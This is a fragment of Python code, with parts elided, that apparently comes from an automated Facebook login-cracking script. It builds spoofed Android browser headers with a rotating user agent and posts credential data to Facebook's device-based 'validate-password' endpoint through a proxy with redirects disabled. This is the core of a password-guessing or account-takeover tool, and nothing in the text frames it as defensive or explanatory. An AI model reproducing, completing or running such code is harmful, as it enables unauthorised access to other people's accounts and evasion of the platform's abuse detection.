...
'Mozilla/5.0 (Linux; U; Android 11;SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.6206938 Build/SRLCO) AppleWebKit/537.36 (KHTML,like Gecko) Version/4.0 Chrome/90.0.6702.80 Mobile Safari/537.36 HeyTapBrowser/21.7.36.1'])
			...
			ses.headers.update({"Host":url,"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://"+url,"content-type":"application/x-www-form-urlencoded","user-agent": ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://"+url+"/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en;q=0.8"})
			bx = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", data=date, allow_redirects = False, proxies=proxy)
